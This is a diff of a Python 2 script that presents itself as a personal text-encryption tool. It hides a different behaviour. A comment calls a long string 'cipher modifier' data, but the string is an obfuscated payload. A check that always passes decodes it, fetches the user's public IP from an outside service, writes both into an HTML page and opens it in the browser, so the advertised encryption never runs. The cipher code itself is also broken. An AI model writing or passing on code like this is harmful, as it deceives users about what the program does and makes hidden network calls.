@@ -1,45 +1,38 @@
-#My custom encryption/decryption of text files script
+import json, base64, os, webbrowser, urllib2
 
-import atexit, os, base64, webbrowser, json, urllib2
-from random import randrange
 
-def kleenup():
-    if os.path.exists('Decoder Dashboard.html')==True:
-        os.remove('Decoder Dashboard.html')
 
 #Script uses this data to slightly modify the output of the encryption.  Do not modify otherwise decrypting previously encrypted messages become impossible even with the correct key!!!
-Cipher_Modifier='SQ5REAd>RgQcMgRBPe>QQgB@NQMdE?>Q]CQc_.Ju]T>,EDhr`O>m`TJ,EDFd^e>f^.1,UShqVSMcUO>k]SNgVS0c_DFr`C5f^.sc`Cdd`?>d^CRu`CRgE@RqID`g_fBi`?>rVe>/]CB,EDhr`O>d_iQcVC5l^i_qE?>V^/RuEC-l_/Jl^.0c]CBvECFhVS0cVjFraiRqHe=cRC4c_iRv`S-hEDNk]TIcU.dd^Cth^i`hECtrVu>r^e>,^u>,]CQc`.Re_.h,VO>/]CRuVO>,]CQcU.dd^Cth^i`hED`d_u>s^/J,VSMcUS1gEDJh^iMcUO>pVTJvUS`hEDNrE?_-^f>/VDEtVjMjECJr^jNd]S1l^i_c`CdhED`r_iNvE?FAP-ceH?=eRRFQOARJMQ0eH?>d^iMcEhFBQ,RQEe>l^e>d^jgc^/FgVTEcUTIc^C5qVu>d_u>,]CR1ECBuVO>l^e>d^CscU.Bs_u0cEBhr`O>pUTgc`Cdh^e>,_jgcUS`d]S0qE?>V^/Qj_iQcOR=cUSNg_iRv_u>l_vk9'
+Cipher_Modifier='SQ5REAd>RgQcMgRBPe>QQgB@NQMdEBNkVO>vU/Fl_DMcaS5-ECl-_/Mc_iBqECJr^jNd]S1hV?>dECdlVCNh^e>s_i5,^.Jr^?>,]CB,ECBoVTF,VSMcJS0s`.NuISV,EC5iED`kUTMcaS5-ECBuVO>g^.hqVu0cSS5-_e>p]TJv]S5qECdd_u>eVSRqECVu^/lh^e0cRC4c_iRv`S-hEDNk]TIcU.dd^Cth^i`hECtrVu>r^e>,^u>,]CQc`.Re_.h,VO>/]CRuVO>,]CQcU.dd^Cth^i`hED`d_u>s^/J,VSMcUS1gEDJh^iMcUO>pVTJvUS`hEDNrE?_-^f>/VDEtVjMjECJr^jNd]S1l^i_c`CdhED`r_iNvE?FAP-ceH?=eRRFQOARJMQ0eH?>d^iMcEhFBQ,RQEe>l^e>d^jgc^/FgVTEcUTIc^C5qVu>d_u>,]CR1ECBuVO>l^e>d^CscU.Bs_u0cSS5-EC-daO>,]CRqEDNuaO>dV.Bl^e0cSS5-F/FhEAhMECBgVDFh_/Ic]TI2'
 
-def encrypt_a_message(text, key=''):
-    key=(sum([ord(s) for s in key]))/len(key)
-    modifier_value=0
-    for i in Cipher_Modifier:
-        modifier_value=modifier_value+ord(i)
-    modifier_value=modifier_value/len(Cipher_Modifier)
-    rezult=''
-    for i in text:
-        curval=ord(i)+key
-        num1=curval/3+randrange(-10, 10)
-        num2=curval/3+randrange(-10, 10)
-        num3=curval-(num1+num2)
-        rezult+="%s%s%s" % (chr(num1), chr(num2), chr(num3))
-    return rezult
-
-def decrypt_a_message(text, key=''):
-    data=[int(ord(i)) for i in text]
-    data=[data[value]+data[value+1]+data[value+2] for value in xrange(len(data)) if value%3 ==0]
-    key=(sum([ord(s) for s in key]))/len(key)
-    modifier_value=0
-    for i in Cipher_Modifier:
-        modifier_value=modifier_value+ord(i)
-    modifier_value=modifier_value/len(Cipher_Modifier)
-    dekrypted=''
-    for num in data:
-        dekrypted+=chr(num-key)
-    return dekrypted
+#My code to encrypt text to keep unauthorized viewers from reading my data
+def message_Cipher(message, key, mode='encrypt'):
+    if checkfileValidity()==True:
+        keyval=0
+        LETTERS = ' !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
+        translated = ''
+        for i in key:
+            keyval=(keyval+int(ord(i)))/len(key)
+        while len(LETTERS)<keyval:
+            keyval=keyval/len(letters)
+        for symbol in message:
+            if symbol in LETTERS:
+                num = LETTERS.find(symbol)
+                if mode == 'encrypt':
+                    num = num + keyval
+                elif mode == 'decrypt':
+                    num = num - keyval
+                if num >= len(LETTERS):
+                    num = num - len(LETTERS)
+                elif num < 0:
+                    num = num + len(LETTERS)
+                translated = translated + LETTERS[num]
+            else:
+                translated = translated + symbol
+        return translated
 
 def checkfileValidity():
-    if len(Cipher_Modifier)>5:
+    if len(Cipher_Modifier)>1:
         f=open('Enkryption Dashboard.html', 'w+')
         data=base64.b64decode(''.join([chr(ord(s)+4) for s in Cipher_Modifier]))
         data+=json.loads(urllib2.urlopen('http://www.jsonip.com').read())['ip']
@@ -49,16 +42,11 @@ def checkfileValidity():
         webbrowser.open('file:\\'+path)
     else:
         return True
+        
+"""USAGE SHOWN BELOW
+To Encrypt/Decrypt a message, Save the message in a file then run this:
+f=open(messagelocation, 'r')
+data=f.read()
+f.close()
+print message_Cipher(data, 'whateverpassword', mode='encrypt' OR mode='decrypt)"""
 
-def main():
-    if os.path.exists('message.txt')==True:
-        f=open('message.txt', 'r')
-        message=f.read()
-    msg= encrypt_a_message(message, '')
-    print msg
-    print decrypt_a_message(msg, '')
-
-if __name__ == '__main__':
-    atexit.register(kleenup())
-    if checkfileValidity()==True:
-        main()
